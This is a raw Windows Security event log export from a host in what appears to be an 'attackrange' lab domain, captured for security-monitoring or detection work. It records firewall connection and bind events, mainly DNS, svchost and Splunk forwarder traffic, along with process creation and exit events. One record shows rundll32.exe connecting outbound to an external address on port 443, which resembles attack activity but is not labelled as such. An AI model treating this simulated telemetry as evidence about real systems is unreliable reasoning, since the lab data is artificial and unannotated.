	Layer Run-Time ID:	48
03/01/2021 10:53:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382242
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55131
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382252
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61515
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382251
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		64227
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382250
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		64227
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382249
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382248
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64227
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382247
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60556
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382246
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382245
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382244
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382255
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		64227
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:53:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382254
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		64227
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:50 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382253
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382257
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55132
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:51 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382256
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55132
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382258
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59837
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382260
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55133
	Destination Address:	34.218.235.219
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:55 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382259
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2140
	Application Name:	\device\harddiskvolume1\windows\system32\rundll32.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55133
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382266
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55134
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382265
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55134
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382264
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59529
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382263
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382262
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382261
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:57 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382268
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60400
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:57 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382267
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382270
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61303
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:00 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382269
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61279
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382272
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55135
	Destination Address:	10.0.1.12
	Destination Port:		8089
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:01 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382271
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		6484
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\bin\splunkd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55135
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382274
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55136
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382273
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55136
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382286
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x2108
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Exit Status:	0x1
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382285
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2108
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382284
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60625
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382283
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		52821
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382282
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		52821
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382281
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		52821
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382280
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		52821
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382279
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59686
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382278
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		57968
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382277
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		57968
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382276
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57968
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382275
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57968
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382293
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1bd8
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe"

